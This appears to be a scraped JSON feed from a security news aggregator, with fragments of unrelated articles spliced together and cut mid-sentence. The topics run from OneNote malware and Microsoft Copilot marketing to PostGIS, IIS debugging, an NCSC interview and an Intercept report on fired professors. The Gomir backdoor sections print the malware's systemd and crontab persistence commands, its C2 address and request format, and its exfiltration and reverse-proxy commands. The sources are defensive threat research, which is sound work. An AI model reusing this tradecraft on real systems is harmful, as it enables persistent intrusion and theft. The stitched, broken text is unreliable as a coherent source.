socket.\nSince reverse TCP shells are the most common type of shellcode used for connecting back to the attacker's machine, we set up breakpoints in ws2_32.dll (shown in Figure 12) to determine whether the connect function is called. And if so, we could extract the arguments passed down to it. These arguments often have the IP address and port number to which the payload attempts to connect.\nAs expected, the shellcode stopped at the connect function call. Upon dumping the values of the RDX register, we were able to identify the contents of the sockaddr_in struct, as shown in Figure 13.\nAs shown in Figure 14, we then wrote a Python script to unpack the content of the sockaddr_in structure identified above.\nExecuting the above Python script gave us the output shown in Figure 15, indicating the attacker is connecting to a local machine on port 4444, potentially to an attacker-controlled machine.\nConclusion\nWe conclude that OneNote as an attack vector is more versatile than we initially thought. It can carry executable payloads, in addition to script-based downloaders. Also, like many other file types, attackers can use it for lateral movement.\nWhen embedding malicious payloads inside OneNote files, attackers mainly leverage JavaScript, PowerShell, Batch and VBScript. However, attackers occasionally use binary payloads such as executables or even Office 97-2003 files to achieve their objectives.\nOrganizations can consider blocking embedded payloads with dangerous extensions within OneNote files to protect their users against such attacks. More broadly, we recommend people limit their exposure by checking the embedded payload filenames and extensions in OneNote files by hovering over any buttons or images before clicking them.\nPalo Alto Networks customers are better protected from the threats discussed above through the following products:\nNext-Generation Firewall with cloud-delivered security services including WildFire.\n-\nPrisma Access devices with cloud-delivered security services including WildFire.\n-\nCortex XDR and XSIAM agents help protect against post-exploitation activities using the multi-layer protection approach.\n-\nThe Unit 42 Incident Response team can also be engaged to help with a compromise or to provide a proactive assessment to lower your risk.\n-\nIndicators of Compromise\nThe following are links to our Github repository containing file hashes for the OneNote files and payloads discovered during our research for this article.\n11,226 SHA256 hashes for the malicious OneNote files and payloads \u2013 GitHub\n-\nSHA256 hashes for OneNote files mapped to SHA256 hashes for the payloads \u2013 GitHub\n-\nAdditional Resources\nThe Adventures of Malicious OneNote Attachments in Cortex XDR Land \u2013 Unit 42, Palo Alto Networks\n-\nMicrosoft OneNote File Format \u2013 Microsoft\n-\nGet updates from\nPalo Alto\nNetworks!\nSign up to receive the latest news, cyber threat intelligence and research from us\nBy submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.", "hash": "aace6f5c8d6025d5a829c6dcc93ae610fe4a8371d6c942c2b80273ae3f5b383a", "id": "9dddc305-8cdc-4704-8754-dcf44c2bdf03", "link": "https://unit42.paloaltonetworks.com/payloads-in-malicious-onenote-samples/", "osint_source_id": "2ff0312f-f9dd-487f-ab1c-98494e4e0fba", "published": "2024-05-16T10:00:02", "source": "https://feeds.feedburner.com/Unit42", "story_id": "47c108ad-18d9-4160-919b-21f7569320d2", "title": "Payload Trends in Malicious OneNote Samples"}], "tags": {"92d057720eab41e9c6bb684e834da632ff3d79b1d42e027e761d21967291ca50": {"name": "92d057720eab41e9c6bb684e834da632ff3d79b1d42e027e761d21967291ca50", "tag_type": "sha256s"}, "Incident response": {"name": "Incident response", "tag_type": "Cybersecurity"}, "Japanese": {"name": "Japanese", "tag_type": "MISC"}, "Microsoft": {"name": "Microsoft", "tag_type": "ORG"}, "Microsoft OneNote": {"name": "Microsoft OneNote", "tag_type": "MISC"}, "Office": {"name": "Office", "tag_type": "MISC"}, "OneNote": {"name": "OneNote", "tag_type": "MISC"}, "Palo Alto Networks": {"name": "Palo Alto Networks", "tag_type": "ORG"}, "SHA256": {"name": "SHA256", "tag_type": "MISC"}, "d48bcca19522af9e11d5ce8890fe0b8daa01f93c95e6a338528892e152a4f63c": {"name": "d48bcca19522af9e11d5ce8890fe0b8daa01f93c95e6a338528892e152a4f63c", "tag_type": "sha256s"}, "phishing": {"name": "phishing", "tag_type": "Cybersecurity"}}, "title": "Payload Trends in Malicious OneNote Samples"}, {"attributes": [{"created": "2024-05-16T17:17:01.666944", "id": "566c1c97-6482-4420-88a0-161fed320c0b", "key": "WORDLIST_BOT", "value": "1"}, {"created": "2024-05-16T17:34:02.975683", "id": "8e4fd35d-a9b7-4c0c-afc4-62fbf0e45d2e", "key": "NLP_BOT", "value": "16"}], "created": "2024-05-16T10:00:00", "id": "bf582988-fc99-4eb8-baf7-54c29d684d98", "news_items": [{"author": "BeauHD", "content": "AT&T Goes Up Against T-Mobile, Starlink With AST SpaceMobile Satellite Deal (pcmag.com) 12\nMichael Kan reports via PCMag: AT&T has struck a deal to bring satellite internet connectivity to phones through AST SpaceMobile, a potential rival to SpaceX's Starlink.

Gomir is structurally almost identical to GoBear, with extensive sharing of code between malware variants.\nBackground\nSpringtail is a tight-knit espionage group that initially specialized in attacks on public sector organizations in South Korea. The group first came to public attention in 2014, when the South Korean government said it was responsible for an attack on Korea Hydro and Nuclear Power (KHNP). Multiple employees at KHNP were targeted with spear-phishing emails containing exploits that installed disk-wiping malware on their machines. The U.S. government has said that the group is a unit of North Korea\u2019s military intelligence organization, the Reconnaissance General Bureau (RGB).\nThe group was the subject of a U.S. government alert in recent days due to attempts to exploit improperly configured DNS Domain-based Message Authentication, Reporting and Conformance (DMARC) record policies to conceal social engineering attempts. According to a joint advisory issued by the Federal Bureau of Investigation (FBI), the U.S. Department of State, and the National Security Agency (NSA), the group has been mounting spear phishing campaigns pretending to be journalists, academics, and experts in East Asian affairs \u201cwith credible links to North Korean policy circles\u201d.\nTrojanized software packages\nThe campaign, which was first documented by South Korean security firm S2W in February 2024, saw Springtail deliver a new malware family named Troll Stealer using Trojanized software installation packages. Troll Stealer can steal a range of information from infected computers including files, screenshots, browser data, and system information. Written in Go, like many newer Springtail malware families, Troll Stealer contained a large amount of code overlap with earlier Springtail malware.\nTroll Stealer\u2019s functionality included the ability to copy the GPKI (Government Public Key Infrastructure) folder on infected computers. GPKI is the public key infrastructure schema for South Korean government personnel and state organizations, suggesting that government agencies were among the targets of the campaign.\nS2W reported that the malware was distributed inside installation packages for TrustPKI and NX_PRNMAN, software developed by SGA Solutions. The installation packages were reportedly downloaded from a page that was redirected from a specific website.\nSouth Korean security firm AhnLab subsequently provided further details on the downloads, saying they originated from the website of an association in the construction sector. The website required users to log in and the affected packages were among those users had to install to do so.\nSymantec has since discovered that Troll Stealer was also delivered in Trojanized Installation packages for Wizvera VeraPort. It is unclear how these installation packages were delivered during the current campaign. Wizvera VeraPort was previously reported to have been compromised in a North Korea-linked software supply chain attack in 2020.\nTroll Stealer and GoBear\nTroll Stealer appears to be related to another recently discovered Go-based backdoor named GoBear. Both threats are signed with a legitimate certificate issued to \u201cD2innovation Co.,LTD\u201d. GoBear also contains similar function names to an older Springtail backdoor known as BetaSeed, which was written in C++, suggesting that both threats have a common origin.\nAhnLab later explicitly linked the two threats, saying that many of the malicious installers it had analyzed contained both Troll Stealer and either of the GoBear or BetaSeed backdoors, which it referred to as the Endoor malware family.\nSeveral weeks later, GoBear was being distributed by a dropper masquerading as an installer for an app for a Korean transport organization. In this case, the attackers did not Trojanize a legitimate software package but instead disguised the dropper as an installer featuring the organization\u2019s logos. The dropper was signed with what appeared to be a stolen certificate.\nGomir backdoor\nSymantec\u2019s investigation into the attacks uncovered a Linux version of this malware family (Linux.Gomir) which is structurally almost identical and shares an extensive amount of distinct code with the Windows Go-based backdoor GoBear. Any functionality from GoBear that is operating system-dependent is either missing or reimplemented in Gomir.\nWhen executed, it checks its command line and if contains the string \u201cinstall\u201d as its only argument, it will attempt to install itself with persistence.\nTo determine how it installs itself, Gomir checks the effective group ID (as reported by the getegid32() syscall) of its own process. If the process is running as group 0, Gomir assumes that it is running with superuser privileges and attempts to copy itself as the following file:\n/var/log/syslogd\nIt then attempts to create a systemd service with the name \"syslogd\" by creating the file:\n/etc/systemd/system/syslogd.service\nThe file contains:\n[Unit]\nAfter=network.target\nDescription=syslogd\n[Service]\nExecStart=/bin/sh -c \"/var/log/syslogd\"\nRestart=always\n[Install]\nWantedBy=multi-user.target\nGomir will then enable and start the created service by executing the following sequence of commands:\n${SHELL} -c systemctl daemon-reload\n${SHELL} -c systemctl reenable syslogd\n${SHELL} -c systemctl start syslogd\nIt will then delete the original executable and terminate the original process.\nIf the process is running as any group other than 0, Gomir attempts to configure a crontab to start the backdoor on every reboot. It first creates a helper file (cron.txt) in the current working directory with the following content:\n@reboot [PATHNAME_OF_THE_EXECUTING_PROCESS]\nNext, it seems to attempt to list any pre-existing crontab entries by running the following command:\n/bin/sh -c crontab -l\nIt appends the output to the created helper file.\nGomir then updates the crontab configuration by executing the following command:\n${SHELL} -c crontab cron.txt\nGomir then deletes the helper file before executing itself without any command-line parameters.\nOnce installed and running, Gomir periodically communicates with its command-and-control (C&C) server by sending HTTP POST requests to: http://216.189.159[.]34/mir/index.php\nWhen pooling for commands to execute, Gomir requests with the following HTTP request body:\na[9_RANDOM_ALPHANUMERIC_CHARACTERS]=2&b[9_RANDOM_ALPHANUMERIC_CHARACTERS]=[INFECTION_ID]1&c[9_RANDOM_ALPHANUMERIC_CHARACTERS]=\nThe INFECTION_ID is generated using the following method:\ndef generate_infection_id(hostname, username):\nhexdigest = hashlib.md5(hostname + username).hexdigest()\nreturn \"g-\" + hexdigest[:10]\nThe expected body of the HTTP server response is a string starting with the letter S. Gomir then attempts to decode the remaining characters of the string using the Base64 algorithm. The decoded blob has the following structure:\nOffset | Size | Description |\n---|---|---|\n0 | 4 Bytes | Encryption key |\n4 | Remainder of the blob | Encrypted command |\nGomir then uses a custom encryption algorithm to decrypt the previously discussed command.\nThe first two characters of the command identify the operation to execute. Gomir allows the execution of 17 different commands. The commands are almost identical to those supported by the GoBear Windows backdoor:\nOperation | Description |\n---|---|\n01 | Pauses communication with the C&C server for an arbitrary time duration. |\n02 | Executes an arbitrary string as a shell command (\"[shell]\" \"-c\" \"[arbitrary_string]\"). The shell used is specified by the environment variable \"SHELL\", if present. Otherwise, a fallback shell is configured by operation 10 below. |\n03 | Reports the current working directory. |\n04 | Changes the current working directory and reports the working directory\u2019s new pathname. |\n05 | Probes arbitrary network endpoints for TCP connectivity. |\n06 | Terminates its own process. This stops the backdoor. |\n07 | Reports the executable pathname of its own process (the backdoor executable). |\n08 | Collects statistics about an arbitrary directory tree and reports: total number of subdirectories, total number of files, total size of files |\n09 | Reports the configuration details of the affected computer: hostname, username, CPU, RAM, network interfaces, listing each interface name, MAC, IP, and IPv6 address |\n10 | Configures a fallback shell to use when executing the shell command in operation 02. Initial configuration value is \"/bin/sh\". |\n11 | Configures a codepage to use when interpreting output from the shell command in operation 02. |\n12 | Pauses communication with the C&C server until an arbitrary datetime. |\n13 | Responds with the message \"Not implemented on Linux!\" (hardcoded). |\n14 | Starts a reverse proxy by connecting to an arbitrary control endpoint. The communication with the control endpoint is encrypted using the SSL protocol and uses messages consistent with https://github.com/kost/revsocks.git, where the backdoor acts as a proxy client. This allows the remote attacker to initiate connections to arbitrary endpoints on the victim network. |\n15 | Reports the control endpoints of the reverse proxy. |\n30 | Creates an arbitrary file on the affected computer. |\n31 | Exfiltrates an arbitrary file from the affected computer. |\nHeavy focus on supply chain attacks\nThis latest Springtail campaign provides further evidence that software installation packages and updates are now among the most favored infection vectors for North Korean espionage actors. Variations of this tactic include:\nSoftware supply chain attacks\n-\nTrojanized software installers\n-\nFake software installers\n-\nThe most notable example to date is the 3CX supply chain attack, which itself was the result of the earlier X_Trader supply chain attack. Springtail, meanwhile, has focused on Trojanized software installers hosted on third-party sites requiring their installation or masquerading as official apps. The software targeted appears to have been carefully chosen to maximize the chances of infecting its intended South Korean-based targets.\nProtection/Mitigation\nFor the latest protection updates,

I didn\u2019t then have to take all of that content across to a different platform. It was all available there.\u00a0\u00a0\n\u00a0\nPhilip: We would in no way ever go near any of these early AI tools that were being released if we weren\u2019t 100% confident that our data and the data that we are using from our customers is kept 100% secure.\u00a0 With Copilot, we know that none of this data is going back to the language models, nor is any of our data even going to leave our environment.\u00a0 We know that when we sign CDAs and NDAs with our clients, that they can be 100% confident that we are adhering to those and that they can trust us with their information.\u00a0\n\u00a0\nWhat are some ways Copilot for Microsoft 365 is helping you be more effective?\u00a0\nJayshwini: Copilot gives me new fresh ideas that I can then go and work off instead of just, you know, starting at a blank screen. Prior to Copilot, a blog draft would normally take about 3 weeks to write up, to finalize, and then to post. Whereas now with Copilot, I feel like it\u2019s really possible for me to get two blog drafts out in a week.\u00a0\n\u00a0\nPhilip: I can be completely engaged on calls and focus on how to steer this call in the right direction to get the best out of everyone on that call.\u00a0 I make a few notes on my notepad of the specific topics that were discussed and ask Copilot to recap after. Not only does Copilot transcribe everything perfectly from our calls, but it's able to pick up highly specific terminology relevant to our particular industry.\u00a0\u00a0\u00a0\n\u00a0\nHow has this ultimately changed the way people work?\u00a0\nPhilip: We've started actually recognizing what prompts work near enough every time for each different section of a report that we need to write, so we're building them into our template so our medical writers know immediately here\u2019s a particular prompt that will help you to get started on this particular section. And what that actually does is it frees up our medical writers from the repetitive tasks, so they can focus on understanding what their data is trying to say and enhancing the quality and the strategy of what we\u2019re trying to achieve with that document for our clients.\u00a0\n\u00a0\nCheck out the full customer story and other customer stories here.\n\u00a0\n2024 Work Trend Index Survey: Insights from SMBs\u00a0\nIn the dynamic landscape of small and medium businesses, the integration of AI is not just an option\u2014it's a strategic necessity. The 2024 Work Trend Index Survey show that 78% of SMB workers across the world are already employing AI tools. With 71% of SMBs finding daily tasks energetically taxing and 67% finding innovation and strategic thinking burdensome, the pressing need for AI solutions is evident. A substantial number, over 50%, feel overwhelmed by data retrieval tasks and endure a lack of dedicated focus time.\u00a0\u00a0\u00a0\n\u00a0\nThe productivity benefit is huge. Small business productivity is only half that of large companies, raising it to top-quartile levels relative to large companies is equivalent to 5 percent of GDP in advanced economies and 10 percent in emerging economies, according to this month\u2019s McKinsey Global Institute report.\u00a0\u00a0\n\u00a0\nDownload the Work Trend Index - SMB executive summary. See\u00a0how the data compares for small and medium-sized businesses and in US metropolitan areas.\u00a0Read the full report on WorkLab.\n\u00a0\u00a0\nAI for every business\u00a0\nWhile leveraging AI offers SMBs an advantageous edge, a conspicuous training deficit exists \u2013 only one third of SMB AI users have received training. To bridge the training deficit, we continue to publish resources to help every role, in every business, get more out of copilot wherever you are in your journey.\u00a0 Check out these recently published resources:\u00a0\u00a0\n\nThe Right Way to AI: What we\u2019re learning about successful AI adoption from companies getting it right.

It not only shows the location of a real-world asset, but it also helps to paint the picture of how that asset is impacted by its surroundings. Many everyday questions are answered by analyzing data based on location and proximity to other locations.\n\nEnterprises that own and manage land may want to not only store the correct outline of a property as a polygon but also manage revenue or make risk-based decisions given the location of the property.\nA transportation company will want to know the progress of its truck fleet at any given time. Estimating the time of delivery and solving for last mile logistics.\nA telecommunications company may want to assess the impact of weathering on its equipment, or the estimated customer reach given the topology of the land on which the tower is located.\nOr a tourist visiting a large city may want to choose the location of their lodgings based on proximity to landmarks and transportation.\n\nAnalysis involving spatial data impacts any enterprise or organization that owns, maintains, or manages physical assets.\nHowever, working with spatial data can have its challenges. From different types of spatial representations to spatial reference considerations to availability of analytical functionality.  Many solutions make it possible to work with spatial data, but they often focus on one aspect, or one set of workflows and it can be daunting to pick the right solution for your workflow.\n \nHow do you use PostGIS to work with spatial data?\nOver the years, PostgreSQL has been a crucial part of many spatial workflows, primarily because of the extensive set of spatial capabilities available through the PostGIS extension. Created over 20 years ago, the extension kept growing in capabilities as the needs of the spatial market evolved. It allows for representation of data as points, lines and polygons, in two spatial data types. \n\nBeginning with the st_geometry spatial type, which allows for persistence of points, lines and polygons projected to a flat surface such as a map or a monitor screen. It includes the standard set of spatial references and the ability to reproject between them, along with spatial indexes and extensive range of analytical functions. \nAs spatial workflows encompassed more global data, the st_geography spatial type was introduced, which represents data as points, arcs and polygons referenced to a spheroid.\nThis data is stored as latitude and longitude, using the WGS 84 datum, to approximate the shape of the globe. It is always persisted with spatial reference (SRID) of 4326. The type comes with its own set of analytical functions. \nThe PostGIS extension has the distinction of supporting both spatial types, the ability to perform analysis and maintain precision and accuracy of data in each type as well as the ability to cast data from one type to another. So, it can be used to maintain the correctness of projected data such a land parcel, or a road in st_geometry, and it can be used to represent data on a global scale such as ride sharing apps or airplane routes in st_geography.  \nIn time, several other PostGIS extensions were created, each to work with different spatial representations, such as raster, point clouds and 3D data and perform operations such as geocoding or topology modeling.\n \nHow do you enable Azure Database for PostgreSQL \u2013 Flexible Server to work with spatial data?\nAzure Database for PostgreSQL - Flexible Server is a fully managed database-as-a-service based on the community version of PostgreSQL which provides the ability to extend the functionality of the instance using extensions, which once loaded, will function like built-in features.  \n \nThe following spatial extensions can be installed:\u00a0\n\nPostGIS - primary spatial extension for PostgreSQL.\u00a0\u00a0\nPostGIS _Topology - model connectivity between features, such as road networks or land parcels\u00a0\nPostGIS_Raster \u2013 store and analyze bands of raster data, from imagery to land use or soil types\u00a0\nPostGIS_Tiger_Geocoder - use spatial data collected as part of the Census Bureau's census, to create address points.\u00a0\nPostGIS_sfcgal - work with 3D data, such as building heights or surface dimensionality.\u00a0\n\nYou can learn more about Azure Database for PostgreSQL \u2013 Flexible Server\u00a0here.\n\u00a0\nTry it yourself!\nIn this example you are going to look for Airbnb rentals in New York City, within walking distance of a subway station.

One particular issue that developers often face is when an application throws an exception and triggers Just-In-Time (JIT) debugging. JIT debugging is a feature that allows Visual Studio to automatically launch and debug an application running outside of the Visual Studio environment whenever it encounters an error or crash. While this can be a powerful tool for diagnosing issues, it can also disrupt the normal operation of the application, causing downtime and hindering productivity. In this blog, we will explore the implications of JIT debugging, understand why this exception occurs, and discuss strategies to manage and prevent application pool interruptions.\n \nWhile working on a web application, you may encounter the below exception that also stops the application pool.\n \n\nTroubleshooting Steps:\n====================\nReview the Application event logs.\n \nFaulting application name: w3wp.exe, version: 10.0.17763.1, time stamp: 0xcfdb13d8\nFaulting module name: clr.dll, version: 4.8.4645.0, time stamp: 0x648f6f63\nException code: 0xc0000005\nFault offset: 0x0000000000002cad\nFaulting process id: 0x1914\nFaulting application start time: 0x01da79eee4b4c819\nFaulting application path: c:\\windows\\system32\\inetsrv\\w3wp.exe\nFaulting module path: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clr.dll\nReport Id: a2b6cfb0-72b7-4589-b027-21aa3222a83f\nFaulting package full name:\nFaulting package-relative application ID:\nReview the System event logs.\n \nApplication popup: Visual Studio Just-In-Time Debugger : An unhandled Microsoft .NET Framework exception occurred in w3wp.exe [6420].

If you look at CHERI, there's a mechanism of addressing memory safety and legacy codebases through to rust and similar. We know how to do it technically.\n\"The challenge is we actually have a market problem and actually producing the level of cyber-resilient technology we actually want and we actually need. So, we have to ask ourselves, why is it that it's not being realized in practice?\"\nHe pointed to the circa 14 percent increase in disclosed and registered vulnerabilities, the ones that intelligence agencies are aware of, that is, to illustrate the point.\n\"We know that there are various adversaries who are amassing vulnerabilities and not disclosing them in the way that we want, and this is compound growth,\" he said.\n\"Similarly, the claimed security efficacy of solutions is not realized in practice, either in a solution in isolation or in operations. We have claims, not meeting reality.\"\nThe presence of decades-old vulnerability classes pervade software still to this day, such as the recent spate of path traversal bugs, but they aren't blamed on lazy development so much as they are on technology debt \u2013 which is just one part of the broken market.\n\"We have levels of technical debt, extremely high levels in organizations, and in technology more generally. And the vulnerability when it is found, that technical debt is often really, really quite shallow.\"\nOne of the main issues around tech debt is that while we can measure it, the industry needs to impose a cost of negligence on failing vendors, and not simply allow them to escape that liability through their terms and conditions.\nThe idea of holding vendors to account in this way and ensuring there are significant penalties for security failings is a core tenet of what would be an ideal reform of the market, in Whitehouse's view, and it's one the industry has held for years.\nThat view is of course the same as his counterparts at CISA too. At RSA last week, Easterly suggested the federal government should play a role in ensuring vendors are shipping secure products.\nThere is, of course, the possibility that the money governments pay for software isn't sufficient to be a forceful enough lever for change.\nIf one vendor can afford to lose a government sale while keeping their plethora of existing customers, then there's nothing stopping them from simply backing away and refusing to make the changes the industry needs.\nThat's where legislation, and to a point regulation comes in. If the cost-of-negligence burden is to be placed on the vendors, then it will likely have to come via the legal system. The regulatory and legislative process is often too slow to adapt to the changing tech industry, however.\nOn the flipside, vendors that demonstrate proactivity in embracing improved security practices, such as secure by design, should be incentivized to do so. Those incentives will likely center on transparency around software components and technical debt, and the negative reward of evading punishments for bad practice.\nThis discussion doesn't even touch upon the ever-present issue of security in open source software, which is an entirely different beast.\nUK and US lead international efforts to raise AI security standards\n-\nRSA Conference 2024: The good, the bad, and the downright worrying\n-\nWorld's governments to keep spending to erase technical debt\n-\nUK's National Cyber Security Centre entry code cracks up critics\n-\nFundamentally, the market in its current state is driven by value and cost, NCSC's CTO argued. \"That is the enemy of cybersecurity,\" Whitehouse said, and cost is everything in the boardroom.\nCyber fatigue is rife among business decision-makers \u2013 many just want to be able to put a lump sum down, perhaps over just a few years, and have security addressed forever. It, of course, doesn't work like that, so the proper incentives need to be in place to ensure the focus on security is more of a marathon than a sprint.\nAway from the current security threats, of which there are many, there is also a wave of exciting tech on the horizon. Like it or not, human-machine interfaces are coming, for example, but Whitehouse addressed this in a way that questioned whether the security industry is properly set up to welcome that technology into the world safely.\n\"We do not have a technology challenge. We know how to build cybersecurity-resilient technology. We have a fundamental market challenge to do so. So, how we incentivize that market to do it will be on us all in the next period if we want to ultimately win.\" \u00ae", "hash": "76cc8aff04af02d922683901dbb96457f7b02dd506ad80fe1b090e8503554b0d", "id": "60c35d58-de07-4c07-9c7b-5740c942b1ca", "link": "https://go.theregister.com/feed/www.theregister.com/2024/05/16/ncsc_cto_broken_market_must/", "osint_source_id": "a94d3f15-5689-470c-9d1f-670b8c63491d", "published": "2024-05-16T09:33:06", "source": "http://www.theregister.co.uk/security/headlines.atom", "story_id": "794d2d7d-25a0-4ac3-846a-8de00c6aac04", "title": "NCSC CTO: Broken market must be fixed to usher in new tech"}], "tags": {"Britain": {"name": "Britain", "tag_type": "LOC"}, "CISA": {"name": "CISA", "tag_type": "ORG"}, "CTO": {"name": "CTO", "tag_type": "ORG"}, "CyberUK": {"name": "CyberUK", "tag_type": "MISC"}, "Easterly": {"name": "Easterly", "tag_type": "PER"}, "Jen Easterly": {"name": "Jen Easterly", "tag_type": "PER"}, "NCSC": {"name": "NCSC", "tag_type": "ORG"}, "Ollie Whitehouse": {"name": "Ollie Whitehouse", "tag_type": "PER"}, "RSA": {"name": "RSA", "tag_type": "ORG"}, "Whitehouse": {"name": "Whitehouse", "tag_type": "PER"}}, "title": "NCSC CTO: Broken market must be fixed to usher in new tech"}, {"attributes": [{"created": "2024-05-16T09:13:30.166658", "id": "5b4e44ca-f70b-4c7f-9615-fae5d9de790d", "key": "NLP_BOT", "value": "7"}, {"created": "2024-05-16T09:08:54.713530", "id": "bd9e4b63-b783-444f-be3d-6b7837c172fd", "key": "WORDLIST_BOT", "value": "1"}, {"created": "2024-05-16T09:10:39.389156", "id": "feac04ab-9fa0-47ba-95ed-6e2f32fb8fcb", "key": "IOC_BOT", "value": "3"}], "created": "2024-05-16T09:29:00", "id": "5ba062cf-18a3-4b83-bc2c-a6857eb654b3", "news_items": [{"author": "Dirk Knop", "content": "Cisco: Updates schlie\u00dfen Sicherheitsl\u00fccken in mehreren Produkten\nIn mehreren Cisco-Produkten klaffen Sicherheitsl\u00fccken, durch die Angreifer sich etwa root-Rechte verschaffen und Ger\u00e4te kompromittieren k\u00f6nnen.\nCisco hat Aktualisierungen f\u00fcr mehrere Produkte herausgegeben.

If the crontab list is updated successfully, the helper file is removed as well.\nGomir supports the following 17 operations, triggered when the corresponding command is received from the C2 via HTTP POST requests.\nPause communication with the C&C server.\n-\nExecute arbitrary shell commands.\n-\nReport the current working directory.\n-\nChange the working directory.\n-\nProbe network endpoints.\n-\nTerminate its own process.\n-\nReport the executable pathname.\n-\nCollect statistics about directory trees.\n-\nReport system configuration details (hostname, username, CPU, RAM, network interfaces).\n-\nConfigure a fallback shell for executing commands.\n-\nConfigure a codepage for interpreting shell command output.\n-\nPause communication until a specified datetime.\n-\nRespond with \"Not implemented on Linux!\"\n-\nStart a reverse proxy for remote connections.\n-\nReport control endpoints for the reverse proxy.\n-\nCreate arbitrary files on the system.\n-\nExfiltrate files from the system.\n-\nAccording to Symantec researchers, the commands above \"are almost identical to those supported by the GoBear Windows backdoor.\"\nBased on the analysis of the campaign, the researchers believe that supply-chain attacks (software, trojanized installers, fake installers) represent the preferred attack method for North Korean espionage actors.\nThe researchers note that the choice of the software to be trojanized \"appears to have been carefully chosen to maximize the chances of infecting its intended South Korean-based targets.\"\nSymantec's report includes a set of indicators of compromise for multiple malicious tools observed in the campaign, including Gomir, Troll Stealer, and the GoBear dropper.\nPost a Comment Community Rules\nYou need to login in order to post a comment\nNot a member yet?

That\u2019s because many of the professors most supportive of Palestine don\u2019t have jobs anymore.\nThis is nowhere truer than in the Gaza Strip \u2014 where all 12 universities have been reduced to rubble, and more than 90 professors have been reported killed during Israel\u2019s assault on the territory. The gravity of what United Nations experts warn could amount to U.S.-backed \u201cscholasticide\u201d has no equivalent on American soil.\nYet Israel\u2019s attempted eradication of intellectual life in Gaza echoes far beyond the territory, with U.S. universities ensuring that some professors vocal in their support of Palestine can no longer do their jobs either.\nSince the beginning of Israel\u2019s war on Gaza, academics in fields including politics, sociology, Japanese literature, public health, Latin American and Caribbean studies, Middle East and African studies, mathematics, education, and more have been fired, suspended, or removed from the classroom for pro-Palestine, anti-Israel speech.\nThese educators have little in common. They live in different cities and states and hail from different countries. Some have been teaching in their institutions for decades, some were newly hired. Some taught at private universities, others public. They have varying degrees of job security, from a tenured professor to the most precarious adjunct contracts. And they are racially, ethnically, religiously, age, and gender diverse.\nWhat they share is that, in recent months, they have all staked out positions in favor of Palestinian freedom \u2014 positions that lead them to be targeted by pro-Israel groups.\nFrom campus to campus, professors have defended students\u2019 right to protest, but when scholars themselves espouse support for Palestine and opposition to the Israeli state, professional consequences have frequently been grave.\nThere\u2019s no official tally of the number of academic workers who have lost jobs or faced suspension over support for Palestine, not least because higher education in this country is disarticulated, often privatized, and reliant on short-term contract labor. By and large, professors facing job loss and suspensions over Palestine have brought these allegations into public view by speaking out themselves. Scores of academics across the country are likely under investigation, and many stand to have their contracts quietly expire without renewals.\nThe Intercept spoke with more than a dozen professors, both adjuncts and those with tenure, whose employment has been imperiled by their pro-Palestine speech. Of the professors I talked to, all were at one point under investigation since October 7; some of the probes closed without findings of wrongdoing. Several faced varying degrees of suspensions, and four of the professors lost their jobs or expect to lose them next week when the semester ends without the renewal of their contracts.\nThe interviews, including those with campus labor activists and academic associations, revealed a pattern of politically motivated repression where campaigns by pro-Israel advocates can mar the careers of academics because of comments that express outrage at Israel\u2019s ongoing occupation and its war in Gaza.\n\u201cOf the cases that we\u2019ve opened, none of them have been related to pro-Israel speech. All of them have been in support of the Palestinian cause.\u201d\n\u201cThe bulk of our inquiries, even our cases, have to do with violations of due process related to non-reappointment, to dismissal, to tenure award, et cetera,\u201d said Anita Levy, senior program officer with the American Association of University Professors. Levy told me that the nonprofit organization, which advocates for faculty rights and academic freedom, currently has opened five cases in recent months related to pro-Palestinian speech.\n\u201cWhen we get five or six of these cases in a two-month period, where there are suspensions related to social media posts over a current event, shall we say, the war in Gaza, that is unusual,\u201d she said. \u201cOf the cases that we\u2019ve opened, none of them have been related to pro-Israel speech. All of them have been in support of the Palestinian cause.\u201d\nWe are at the dawn of a \u201cnew McCarthyism,\u201d Levy said. \u201cThis may be the tip of the iceberg.\u201d\nInstitutions are well positioned to eliminate political dissenters from their payrolls under the misleading banner of protecting Jewish people, primed by heightened Republican attacks on higher education.\n\u201cThis is beyond the new McCarthyism. This has to deal fundamentally with Islamophobia, anti-Muslim racism, anti-Arab racism, anti-Palestinian racism,\u201d said Mohamed Abdou, who is a visiting professor in Middle Eastern, South Asian, and African studies at Columbia University \u2014 that is, until this semester ends.\nColumbia President Minouche Shafik announced that the university was cutting ties with Abdou during a congressional hearing last month about antisemitism on campus. Abdou was one of five professors named by the school administrator but the only one without the relative protection of tenure. His one-year contract ends this month.\n\u201cWhat she effectively did was blacklist me globally,\u201d Abdou told me of Shafik\u2019s testimony. (Columbia did not respond to a request for comment.)\nAbdou said he was smeared for words in a Facebook post on October 11 that were taken dramatically out of context. The activist-scholar was framed in Congress and in the right-wing media as an antisemite and Hamas supporter. His lengthy post asks readers to think about a future for Palestine, and support for resistance, beyond the binary of a secularized, Eurocentric state formation, or \u201cHamas and Islamic Jihad\u2019s neoconservative idea of Sharia.\u201d\n\u201cI\u2019m against any form of authoritarianism,\u201d Abdou \u2014 whose work focuses on Islam, anarchism, and settler colonialism since 1492 \u2014 told me.\nOne extramural social media post has been weaponized to undo Abdou\u2019s career, after 20 years of teaching in Canada, Egypt, and the U.S. in fields including queer studies and Indigenous studies, leaving the scholar with scant recourse and limited options. He is hardly alone.\n\u201cFired After 18 Years\u201d\nAnti-Palestinian repression on U.S. campuses since October 7 has not been subtle. Students and faculty face far-reaching discriminatory censure and defamatory allegations for pro-Palestinian advocacy, as administrators jump to appease pro-Israel donors and conservative political interests.\nIn the last months, school administrators called in riot cops to clear student encampments and arrest thousands at Columbia University, City College of New York, Emerson College, Emory University, New York University, the University of Austin at Texas, and more. It was brutal state violence against students not seen since the campus movement against the Vietnam War \u2014 justified this time by flimsy claims about student safety, undergirded by a conflation of anti-Zionism and antisemitism.\nThere have been scenes of faculty solidarity. Last week, faculty members at the New School in New York, where I teach, launched the first faculty-led solidarity encampment, following the shuttering of the student encampment with mass arrests. In late April, dozens of professors and others from New York University formed a line around their protesting students as police were called in to raid their encampment; faculty and students were all arrested together. Footage capturing the arrests of Emory Philosophy Department Chair No\u00eblle McAfee and economics professor Caroline Fohlin, the latter who was slammed brutally to the ground by cops, was shared widely online.\nYet once media attention moves away from encampment sweeps and violent arrests, many professors who have lost work will still be without their livelihoods or left facing precarious futures with their reputations unfairly besmirched.\n\u201cI was fired after 18 years as a professor of Latin American and Caribbean studies at John Jay College of Criminal Justice,\u201d Danny Shaw said. He was told last month by administrators at the college, which is part of the public City University of New York system, that he would not be reappointed to 